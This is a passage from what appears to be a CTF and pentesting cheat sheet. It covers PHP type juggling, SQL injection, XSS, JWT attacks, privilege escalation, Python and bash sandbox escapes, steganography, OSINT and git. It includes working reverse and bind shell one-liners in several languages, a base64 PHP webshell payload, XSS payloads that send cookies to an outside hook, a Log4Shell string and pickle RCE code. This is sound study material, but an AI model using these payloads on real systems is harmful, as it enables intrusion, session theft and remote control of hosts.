	In [PHP](https://en.wikipedia.org/wiki/PHP), the `==` applies type juggling, so if the hash starts with `0e`, then the hash will be evaluated as 0 (scientific notation). This can be used to bypass authentication.

	Since 1/256 hashes have this property, it is relatively easy to bruteforce strings with selected characters.

	example: `md5("240610708") = 0e462097431906509019562988736854`


* `preg_replace` - [Manual](http://php.net/manual/en/function.preg-replace.php)

	A bug in older versions of [PHP](https://en.wikipedia.org/wiki/PHP) where the user could get remote code execution


* `phpdc.phpr` - [GitHub](https://github\.com/lighttpd/xcache/blob/master/bin/phpdc.phpr)

	A command-line tool to decode [`bcompiler`](http://php.net/manual/en/book.bcompiler.php) compiled [PHP](https://en.wikipedia.org/wiki/PHP) code.


* `php://filter for Local File Inclusion` - [Website](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) 

	A bug in [PHP](https://en.wikipedia.org/wiki/PHP) where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:

	```
	http://example.com/index.php?m=php://filter/convert.base64-encode/resource=index
	```


* `data://text/plain;base64` <span style="color:red">❤️</span>

	A [PHP](https://en.wikipedia.org/wiki/PHP) stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868)

	```
	http://dommain.net?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
	```


* `PHP Generic Gadget Chains` - [GitHub](https://github\.com/ambionics/phpggc)

	Payloads for Object injection in `unserialize` on different frameworks.



## Request and Cookie Forgery




* URL Encoding

    URL encoding is a way to encode special characters in a URL. The code is the `%` character followed by the Hex representation of the character in ascii. For example, the `?` character is encoded as `%3F`, space is `%20` etc.
    
    Read [this](https://www.w3schools.com/tags/ref_urlencode.asp) for more details on how to encode characters.


* IP restriction bypass with the `X-Forwarded-For` header

    Some servers use the `X-Forwarded-For` header to check if the request comes from a valid IP address. This is a vulnerability since it can be changed by the client, and used to bypass IP restrictions. 
    
    Use [burp](https://portswigger.net/burp) or python's `requests` library to set the header.


* Authentication bypass with `User-Agent` header

    Some servers use the `User-Agent` header to authenticate the user. Usually this field is used to identify the browser's version and OS, but it can be changed by the client.
    
    Use [burp](https://portswigger.net/burp) or python's `requests` library to set the header.

* Verb tampering

    Servers can have different behaviors depending on the HTTP verb used. For example, a server can return a 404 error when a `GET` request is made, but return a 200 when a `PUT` request is made.

    Read [this](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering) for more details on how to test it.

* AES CBC ciphered cookies

    See [Bit flipping attack](#aes---cbc-mode) for more details.



## SQL Injection



Occurs when user input is not properly sanitized and is used directly in a SQL query. This can be used to bypass authentication, read sensitive data, or even execute arbitrary code on the database server.

The most common one to use is the `"OR 1=1--` injection. This will always return true on a `WHERE` clause.

The application will then see the query as:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = "" OR 1=1--"
```

* SQL `IF` and `SLEEP` statements for Blind SQL Injection

	Used to exfiltrate data when the target does not provide the result of the vulnerable query. If the provided condition is true, the query will take a certain amount of time to execute. If the condition is false, the query will execute faster.

	```sql
	/* Check if the first character of the password is 'a' */
	SELECT IF(substr(password, 1, 1) = 'a', SLEEP(5), 1); 

	/* Check if the second character of the password is 'b' */
	SELECT IF(substr(password, 2, 1) = 'b', SLEEP(5), 1); 
	
	/* etc for all position and letters */
	```


* `sqlmap` - [GitHub](https://github\.com/sqlmapproject/sqlmap)

	A command-line tool written in [Python](https://www.python.org/) to automatically detect and exploit vulnerable SQL injection points.



## XSS

⇨ [SSTI](#ssti)<br>


The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.

Example of XSS :

```html
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```

These sites can be used to create hooks to catch HTTP requests:

| Site |
| --- |
| [`requestb.in`](https://requestb.in/) |
| [`hookbin.com`](https://hookbin.com/) |


* `XSS Cheat sheet` - [CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

* `Filter Evasion` - [CheatSheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

	Bypass XSS filters.

* `HTTPOnly cookie flag`

	When the `HTTPOnly` flag is set, the cookie is not accessible by JavaScript. This can be bypassed by using the target's browser as a proxy to receive the cookie when it is sent to the victim's browser:

	```html
	<!-- With the script tag -->
	<script>
	fetch("https://target-site.url/")
	.then((data) => fetch("https://<myHook>/?/=".concat(JSON.stringify(data)), { credentials: 'include' }));
	</script>

	<!-- With an image -->
	<img src="https://target-site.url/" onerror="fetch('https://<myHook>/?/='+JSON.stringify(this), { credentials: 'include' })">
	```



* `XSStrike` - [GitHub](https://github.com/UltimateHackers/XSStrike)

	A python CLI tool for XSS detection and exploitation.


### SSTI



Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject code into a server-side template, which is then executed server-side. This can lead to Remote Code Execution (RCE).

* Jinja2 - [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)

    Jinja2 is a template engine for Python, notably used in Flask. It can be used to create HTML pages from a template. Even though it uses a sandbox to process data, some tricks allows for RCE on the server.





## JWT



[JSON Web Tokens (JWT)](https://wikipedia.org/wiki/JSON_Web_Token) are a way to authenticate users. They are encoded strings that contain the user's information. The server can decode the JWT and use the information to authenticate the user.

They are encoded in base64 in the following format:
```
header.payload.signature
```
Where:
| Name | Description |
| --------- | ----------- |
| Header | a JSON object that contains the algorithm used to encode the JWT and the type of the token |
| Payload | a JSON object that contains the user's information |
| Signature | the encoded `header` and `payload` using the algorithm specified in the `header` |

* JWT tempering

    JWTs are a way to authenticate users. They are encoded strings that contain the user's information. The server can decode the JWT and use the information to authenticate the user. 
    
    [`jwt_tools`](https://github.com/ticarpi/jwt_tool) can help with modifying the JWTs. They also document common vulnerabilities in JWTs [in their wiki page](https://github.com/ticarpi/jwt_tool/wiki)
    ```bash
    python jwt_tool.py <jwt>        # Inspect the JWT
    python jwt_tool.py -T <jwt>     # Modify (temper) the JWT
    python jwt_tool.py -C -d <jwt>  # Crack the JWT's signature
    ```

* Both asymetic and symetric algorithms

    When both an asymetric and a symetric algorithm are allowed by the server and use the same key, the public key might be used as a secret key in the symetric algorithm. Consequently, the public key can be retrived using the symetric algorithm, and then used to sign/decryot the JWT using the asymetric algorithm.

* Public Key recovery - [GitHub](https://github.com/FlorianPicca/JWT-Key-Recovery)

    When a JWT is signed using an asymetric algorithm, the public key can be recovered using the JWT's signature.


<br><br>

# Pentest

⇨ [Reverse Shell](#reverse-shell)<br>
⇨ [Tricks](#tricks)<br>
⇨ [Common Exploits](#common-exploits)<br>
⇨ [Privilege Escalation](#privilege-escalation)<br>


This section describes common techniques used to pentest an infrastructure. As pentesting is not the main focus of this repository, I recommend using [HackTricks](https://book.hacktricks.xyz) for more pentesting-oriented content.

## Reverse Shell



A [reverse shell](https://en.wikipedia.org/wiki/Shell_shoveling) is a connection initiated by the target host to the attacker listening port. For this, the target needs to be able to route to the attacker, sometimes over the internet.

This is the opposite of a `bind shell`, which is a connection initiated by the attacker to the target host. This way, the attacker does not need to have a routable IP address

Sometimes both types of shells are wrongly called `reverse shell`.

<!--image -->
![Reverse shell](Pentest/Reverse Shell/_img/rev_shell.png#gh-light-mode-only)
![Reverse shell](Pentest/Reverse Shell/_img/rev_shell-dark.png#gh-dark-mode-only)


* `PayloadAllTheThings` - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)

    Compilation of useful payloads and bypass for Web Application Security and Pentest/CTF.

* `netcat` - [Wikipedia](https://en.wikipedia.org/wiki/Netcat)

    A utility for reading from and writing to network connections using TCP or UDP.

    ```bash
    Netcat classic listener
    $ nc -nlvp 4444

    # Netcat connect to listener
    $ nc -e /bin/sh 10.0.0.1 4242
    ```

* `rlwrap` - [GitHub](https://github\.com/hanslub42/rlwrap)

    Allows you to use the arrow keys in a reverse shell.

    ```bash
    $ rlwrap nc -nlvp 4444
    ```

* Upgrade a shell to a TTY shell

    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```

* `ngrok` - [Website](https://ngrok.com/)

    Create a tunnel from the public internet to a port on your local machine.

    ```bash
    $ ngrok http 80 # http tunnel on local port 80
    $ ngrok tcp 4444 # tcp tunnel on local port 4444
    ```

* Common reverse shells - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

    Reverse shells connects to a remote listener. The target needs to be able to route to the attacker.

    ```bash
    # Bash
    $ bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

    # Perl
    $ perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

    # Python
    $ python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

    # PHP
    $ php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'

    # Ruby
    $ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    ```

    Check [this github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) for more reverse shells.

* Common bind shells - [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)

    Bind shells listen on a port and wait for a connection. The attacker needs to be able to route to the target.

    ```bash
    # Netcat
    $ nc -nlvp 4242 -e /bin/bash

    # Perl
    $ perl -e 'use Socket;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'

    # Python
    $ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR,1);s1.bind(("0.0.0.0",4242));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

    # PHP
    $ php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4242);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);
    socket_write($cl,$m,strlen($m));}}'

    # Ruby
    $ ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
    ```

    Check [this github repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) for more bind shells.






## Tricks



Pentesting requires a lot of creativity and out-of-the-box thinking. Here are some tricks that can help you in your journey.

#### Tricks

* Visual studio code server

    Installing a visual studio code server on the target machine can help you in editing files and running commands on the target machine. You can use the following command to install the server on the target machine. It can be easily installed over ssh.

    

    



## Common Exploits



* `Heartbleed`

	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`

	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.

* `libssh - SSH`

	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)

* `Default credentials` - [CheatSheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)

    Unconfigured system can use the default credentials to login.

* `Log4Shell`

	Exploit on the Java library **Log4j**. Malicious code is fetched and executed from a remote JNDI server. A payload looks like `${jndi:ldap://example.com:1389/a}` and need to be parsed by Log4j.

	- [Simple POC](https://github.com/kozmer/log4j-shell-poc)
	
	- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)

	- [ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)

	- [Request Bin](https://requestbin.net/) Useful for detection and environment variable exfiltration.



## Privilege Escalation



* `sudo`

    First thing to check. See what the current user is allowed to do.
    ```bash
    sudo -l # List available commands
    ```


* `PEAS` <span style="color:red">❤️</span> - [GitHub](https://github\.com/carlospolop/PEASS-ng)

    Find common misconfigurations and vulnerabilities in Linux and Windows.

    Send linpeas via ssh
    ```bash	
    scp linpeas.sh user@domain:/tmp
    ```


* setuid Files

    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.

    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.

    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).


    Find files with the setuid bit set.
    ``` bash
    find / -perm -u=s -type f 2>/dev/null
    ```

* `CVE-2021-3156` - [Website](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)

    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.

    Some payload can be found in the [Tools](Pentest/Privilege Escalation/Tools/CVE-2021-3156/) section.




<br><br>

# Jail Break

⇨ [Latex](#latex)<br>
⇨ [Python](#python)<br>
⇨ [Bash](#bash)<br>




## Latex







## Python



* Python 3 builtin functions/constants - [Website](https://docs.python.org/3/library/functions.html)

    Python's builtin functions and constants provide a lot of useful information about the program's environment. Here are the most useful ones:

    | Function | Description |
    | --- | --- |
    | `dir()` | Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that object. |
    | `vars()` | List variables and their value in the current scope with a dict object |
    | `help()` | Invoke the built-in help system. Can be used to execute commands for example in `help(help)` you just need to type `!ls` to execute `ls` |
    | `globals()` | Returns a dict object containing all global variables |
    | `locals()` | Returns a dict object containing all local variables |


* `exec`

    `exec` runs python code from a string. If the user can control the string, it can be used to execute arbitrary code.

    ```python
    exec("__import__('os').system('ls')") # List files
    exec("open('flag.txt').read()")       # Read flag.txt

    # Reverse shell to 10.0.0.1:4242
    exec('socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")') 
    ```

* `eval`

    `eval` evaluates a python expression from a string. It can also be used to execute arbitrary code, but does not allow for multiple statements. (with ';' or '\n')

    ```python
    eval("__import__('os').system('ls')") # List files
    eval("open('flag.txt').read()")       # Read flag.txt
    eval("(a:=globals())") # Walrus operator trick to assign globals() to a variable and return it
    ```
    
* Command obfuscation

    * Unicode

        Python keywords can be written in unicode. For example, `exec` can be written as `eｘec`. This very useful to bypass filters.

        ```python
        def find_unicode_variant(s):
            result = ""
            for c in s:
                offset = ord(c) - ord('A')
                result += chr(0xff21 + offset)
            return result
        ```

        Note: Unicode characters take more than a single byte to be represented in an encoded format. For example `ｘ` is represented by the bytes `ef bd 98`. This can be a problem if the input is filtered to remove non ascii characters or if the size of the input is limited.

    * Hex

        If the input is filtered before being passed to python, the hex representation can be used to bypass the filter.

        ```python
        exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29") # eval("__import__('os').system('ls')")
        ```

        Note: This does not work when the filter is in python since this string is strictly equivalent to `"__import__('os').system('ls')"`

    * Ocal

        Same as hex, it is an alternative representation of python strings.

        ```python
        exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51") # eval("__import__('os').system('ls')")
        ```


* Escape sandbox environment

    When the environment is sandboxed, some functions are not directly available. Global variables can be used to access them.

    ```python
    ().__class__.__base__.__subclasses__() # Gives access to `object` subclasses

* Python's 2 input() function

    `python2`'s `input()` function is equivalent to `eval(raw_input())` in python3. So, you can execute arbitrary python expressions.

    ```python
    open("/tmp/out.txt", "w").write(open(".passwd").readline().strip())
    ```

* Pickle deserialization injection

    `pickle.loads` can execute code when deserializing a user provided string.

    ```python
    class rce():
        def __reduce__(self):
            import os
            return (os.system, ('ls',))
    payload_bytestring = pickle.dumps(rce())
    ```

* Python libraries that can execute commands

    Some python libraries allows for code/command execution when provided with unsanitized input. Here are the most common ones:

    ```python
    df.query('@__builtins__.__import__("os").system("ls")') # Pandas dataframe
    subprocess.call("ls", shell=True)
    subprocess.Popen("ls", shell=True)
    pty.spawn("ls")
    pty.spawn("/bin/bash")
    ```

* When calls are disabled

    WHen calls are disabled, an attacker can use decorators still execute code.

    ```python
    # equivalent to X = exec(input(X))
    @exec
    @input
    class X:
        pass
    ```


    [Google CTF challenge](https://ctftime.org/task/22891)




## Bash



* Missing `ls` or `dir` commands

	If you cannot run `ls`, `dir`, `find` nor `grep` to list files you can use

	```
	echo *
	echo /any/path/*
	```


* restricted bash (`rbash`) - [GitHub Gist](https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290)

	`rbash` is a shell with restriction features. Misconfigured `rbash` can be bypassed.

	```bash
    # List available commands
    compgen -c

    # Run bash without profiles (when rbash is initialized in .bashrc)
    bash --noprofile

    # Read files
	mapfile -t  < /etc/passwd
	printf "$s\n" "${anything[@]}"
	```

* shell from provided commands - [Website](https://gtfobins.github.io/)

    Some commands/binaries allows to pop a shell. Use [GTFOBins](https://gtfobins.github.io/) to find them. Here are the most common ones:

    | Command | Description |
    | --- | --- |
    | less | `!/bin/sh` |
    | vim | `:!/bin/sh` |



<br><br>

# Steganography



### Online tools

* `AperiSolve` <span style="color:red">❤️</span> - [Website](https://www.aperisolve.com/)

	Online tool that run several steganography tools.

* `Steganography Online` - [Website](http://stylesuxx.github.io/steganography/)

	Online tool to hide data in images.


### Detection tools

* `Stegsolve.jar` <span style="color:red">❤️</span> - [Website](http://www.caesum.com/handbook/stego.htm) 

	View the image in different colorspaces and alpha channels. I recommend using [this patched version](https://github.com/Giotino/stegsolve) to be able to zoom out.

* `zsteg` <span style="color:red">❤️</span> - [GitHub](https://github\.com/zed-0xff/zsteg)

	Command-line tool for **PNG** and **BMP** steganography.

* `jsteg` - [GitHub](https://github\.com/lukechampine/jsteg)

    Command-line tool for **JPEG** steganography.

* [Jstego](https://sourceforge.net/projects/jstego/)

    GUI tool for **JPG** steganography.

* `exiftool` <span style="color:red">❤️</span> - [Website](https://exiftool.org/)

	Tool to view and edit metadata in files.


### Image steaganography implementations

Many steganography implementations exists. Here is a list of some of them. 

* `steghide` - [Website](http://steghide.sourceforge.net/)

	Hide data in various kinds of image- and audio-files using a passphrase. The password can be empty.

* `StegCracker` - [GitHub](https://github.com/Paradoxis/StegCracker)

	Brute force passphrases for steghide encrypted files. Different data can have different passphrases.

* `StegSeek` - [GitHub](https://github.com/RickdeJager/stegseek)

	Faster than `stegcracker`.

* `steg_brute.py` - [GitHub](https://github\.com/Va5c0/Steghide-Brute-Force-Tool)

	This is similar to `stegcracker`.

* `stepic` - [Website](http://domnit.org/stepic/doc/)

	Python library to hide data in images.

* `Digital Invisible Ink Tool` - [Website](http://diit.sourceforge.net/)

	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit color)

* `ImageHide` - [Website](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)

	Hide any data in the LSB of an image. Can have a password.

* `stegoVeritas` - [GitHub](https://github.com/bannsec/stegoVeritas/)

	CLI tool to extract data from images.

* Online LSB Tools

	Some online tools to hide data in the LSB of images.

	[https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/) Only supports PNG
	[https://stylesuxx.github.io/steganography/](https://stylesuxx.github.io/steganography/)

* `hipshot` - [Website](https://bitbucket.org/eliteraspberries/hipshot)

	A python tool to hide a video in an image.

### Data hidden in the data format

#### Images

* [`APNG`]

	Animated PNG. Use (apngdis)[https://sourceforge.net/projects/apngdis/] to extract the frames and delays.

* `SVG Layers`

	Data can be hidden under SVG layers. `inkview` can be used to view and toggle the layers.

* `Image thumbnails`

	Image thumbnails can be different from the image itself.
	```
	exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
	```

* Corrupted image files

	See [Images files](#images)

#### Text

* Unicode Steganography / Zero-Width Space Characters

	Messages can be hidden in the unicode characters. For example using the zero-width space character in it. Use a modern IDE like [Code](https://code.visualstudio.com/) to find these characters.

* Whitespace

	Tabs and spaces (for example in the indentation) can hide data. Some tools can find it: [`snow`](http://www.darkside.com.au/snow/) or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)

* `snow` - [Website](http://www.darkside.com.au/snow/)

	A command-line tool for whitespace steganography.


#### Audio

* `spectrogram` - [Wikipedia](https://en.wikipedia.org/wiki/Spectrogram)

	An image can be hidden in the spectrogram of an audio file. [`audacity`](https://www.audacityteam.org/) can show the spectrogram of an audio file. (To select Spectrogram view, click on the track name (or the black triangle) in the Track Control Panel which opens the Track Dropdown Menu, where the spectrogram view can be selected.. )

* `XIAO Steganography` - [Website](https://xiao-steganography.en.softonic.com/)

	Windows software to hide data in audio.

* `DTMF` - [Wikipedia](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).

	Dual tone multi-frequency is a signaling system using the voice-frequency band over telephone lines. It can be used to send text messages over the phone. Some tool: [Detect DTMF Tones](http://dialabc.com/sound/detect/index.html) 
	
#### QR codes

* `QR code` - [Wikipedia](https://en.wikipedia.org/wiki/QR_code) 
	
	Square barcode that can store data.

* `zbarimg` - [Website](https://linux.die.net/man/1/zbarimg)

	CLI tool to scan QR codes of different types.
<br><br>

# OSINT

⇨ [Email](#email)<br>
⇨ [Dorking](#dorking)<br>
⇨ [Images](#images)<br>
⇨ [Map](#map)<br>
⇨ [Username](#username)<br>


* `Wayback machine` - [Website](https://archive.org/)

    Find old/previous versions of a website.

## Email



* `Epieos` - [Website](https://epieos.com)

    Find information about an email.


* `gmail address`

    A gmail address can be used to query public information on google services like Google Maps reviews or Google Calendar events. [Epieos](https://epieos.com) can find such services.





## Dorking



Dorking is the process of using search engines to find information about a target.


* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking) [CheatSheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) 

    Use Google's search engine to find indexed pages that contain specific information.
    provides detailed information about Google Dorks.

    The most common ones are:
    ```bash
    site:example.com           # Search for a specific domain
    inurl: "ViewerFrame?Mode=" # Search for a specific string in the URL (exposed webcams)
    intitle: "index of"        # Search for a specific string in the title of the page (exposed dirs)
    filetype:pdf               # Search for a specific file type
    ```

* `Github Dorks`

    Use Github's search engine to find indexed files that contain specific information. [This documentation](https://docs.github.com/en/search-github/searching-on-github) can be used to craft search queries.

    Github users can be tracked using [Gitive](https://github.com/mxrch/GitFive).

    The most common dork keywords are:
    ```bash
    filename:passwords.txt     # Search for a specific filename
    extension:txt              # Search for a specific file extension
    owner:username             # Search for a specific username
    
    # In commits
    author-name:username       # Search for a specific commit author
    author-email:u@ex.com      # Search for a specific commit author email
    committer-name:username    # Search for a specific committer
    committer-email:u@ex.com   # Search for a specific committer email
    ```

    



## Images



* `EXIF data`

    Metadata of images can be used to find information about the image, such as the location where it was taken, the device used to take the picture, etc.

    Use [exiftool](https://exiftool.org/) to extract metadata from images.

* `Reverse image search` - [Website](https://images.google.fr/)

    Search by image. Can be used to find similar images, or to find the source of an image. Here are the most common search engines:

    | Search engine | Description |
    | --- | --- |
    | [Google Lens](https://images.google.fr/) | The most popular one. Can be used to search quickly parts of an image. |
    | [Bing Images](https://www.bing.com/images) | Microsoft's search engine. |
    | [TinEye](https://tineye.com/) | Reverse image search engine. Very useful to search the exact same image on the internet. |
    | [Yandex](https://yandex.com/images/) | Russian search engine. Can be used to find images that are not indexed by Google. |

    



## Map



* `What 3 words` - [Website](https://what3words.com/)

    Associate 3 words to a location on earth. 

    To be kept in mind for OSINT challenges.

* `Guess location from Images/Google Steet view`

    Several websites such as [Geohints](https://geohints.com) can help find location from Google Street view, or even general images.

* `Google street view`

    Google street view can be used to find location from images. 

    It can also be used to find information about a location, such as the name of a shop or a restaurant.
    

* `ADS-B` - [Wikipedia](https://en.wikipedia.org/wiki/Automatic_Dependent_Surveillance%E2%80%93Broadcast)

    ADS-B is a technology used by air-crafts to broadcast their position. 

    This information can be used to find information about a flight, such as the departure and arrival airports, the flight number, etc.

    [adsbexchange.com](https://globe.adsbexchange.com) can be used to find free public ADS-B data.



## Username



* `Sherlock` - [GitHub](https://github\.com/sherlock-project/sherlock)

    Python script to search for usernames across social networks.



<br><br>

# Miscellaneous

⇨ [Data Science](#data-science)<br>
⇨ [Signal processing](#signal-processing)<br>
⇨ [Git](#git)<br>
⇨ [Esoteric Languages](#esoteric-languages)<br>
⇨ [Wireless](#wireless)<br>


This section details some miscellaneous topics that are not directly related to security challenges, but are still useful to know as a CTF player.

## Data Science

⇨ [Supervised Classification](#supervised-classification)<br>
⇨ [Unsupervised Clasification](#unsupervised-clasification)<br>




* `SciKit Lean` - [Website](https://scikit-learn.org/)

    Machine learning in Python.

* `SciKit Mine` - [Website](https://scikit-mine.github.io/scikit-mine/)

    Data mining in Python.

* `(Book) Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow, Aurélien Géron`

    Very useful book that was used to create this section.

### Supervised Classification



####### Models

* `Logistic Regression`

    High explainability, reasonable computation cost.

* `Decision Tree`

    Performs classification, regression, and multi-output tasks. Good at finding **orthogonal** decision boundaries.

    But very sensitive to small changes in the data, which make them hard to train.


* `Random Forest`

    Very powerful model. Uses an ensemble method to combine multiple decision trees. 


* `Support Vector Machine (SVM)`

    Popular model that performs linear and non-linear classification, regression, and outlier detection.

    Works well with **small to medium** sized datasets.


* `K-Nearest Neighbors (KNN)`


* `Naive Bayes`

* `Multi Layer Perceptron (MLP)`

    A neural network model that can learn non-linear decision boundaries.

    Good for **large** datasets.



### Unsupervised Clasification



###### Models

* `K-Means Clustering`

    Simple clustering algorithm that groups data points into a specified number of clusters.

* `Gaussian Mixture Model (GMM)`

    A probabilistic model that assumes that the data was generated from a finite sum of Gaussian distributions.








## Signal processing



* `Scipy` - [Website](https://scipy.org/install/)

    Can be used for signal processing.

    Example is provided in [process_signal.ipynb](Miscellaneous/Signal processing/Tools/process_signal.ipynb)



## Git



**Git** is a version control system that is used to track changes in a file system. When present, it is possble to view the history of changes, revert to previous versions, and work on different versions of the same file.

Many tutorials and guides are available online, such as [GitHub's tutorial](https://docs.github.com/en/get-started/getting-started-with-git/set-up-git) or [the visual git guide](http://marklodato.github.io/visual-git-guide/index-en.html).

#### Basic usage

* `git commit`

    This command is used to save changes to the local repository. 
    
    Here are some useful options:
    | Option | Description |
    | --- | --- |
    | `-m "message"` | Use the given message as the commit message. |
    | `-a` | Automatically stage files that have been modified and deleted. |
    | `--date="Thu Jan 04 2024 13:33:37 GMT+0100"` | Use the given date as the commit date. **This only sets the `author date` but not the `commiter date`** |

* `git commit --amend`

    This command is used to modify the last commit. It opens the default text editor to modify the commit message. It is also possible to add or remove files from the commit.

    Here are some useful options:
    | Option | Description |
    | --- | --- |
    | `--no-edit` | Use the previous commit message. |
    | `--reset-author` | Use the current user as the author of the commit. |
    | `--date="Thu Jan 04 2024 13:33:37 GMT+0100"` | Use the given date as the commit date. **This only sets the `author date` but not the `commiter date`** |

* `git reset <commit>`

    Undoes all commits after the given commit, but keeps the changes in the working directory. Here are some useful options:
    | Option | Description |
    | --- | --- |
    | `--soft` | Keep the changes in the staging area. |
    | `--hard` | Discard the changes in the staging area. |

* `git log`

    This command is used to view the history of the repository. Here are some useful options:
    | Option | Description |
    | --- | --- |
    | `--oneline` | Show each commit on a single line. |
    | `--graph` | Show the commit history as a graph. |
    | `--all` | Show the history of all branches. |
    | `--since="3 days ago"` | Show commits since the given date. |
    | `--author="name"` | Show commits by the given author. |
    | `--grep="pattern"` | Show commits that match the given pattern. |


#### Tricks

* Change the commiter date to the author date

    *Warning:* This command rewrites the history of the repository. It should only be used on commits that have not been pushed to a remote repository.

    ```bash
    # On the current branch
    git filter-branch --env-filter 'export GIT_COMMITTER_DATE="$GIT_AUTHOR_DATE"'

    # On specific commits
    git filter-branch --env-filter 'if [ $GIT_COMMIT = "commit_hash" ]; then export GIT_COMMITTER_DATE="$GIT_AUTHOR_DATE"; fi'
    ```

* The `HEAD` pointer

    The `HEAD` pointer is a reference to the current commit. It is possible to move the `HEAD` pointer to a different commit using the `git checkout` command. This is useful to view the state of the repository at a specific commit.

    ```bash
    # Move the HEAD pointer to the given commit
    git checkout commit_hash
    ```

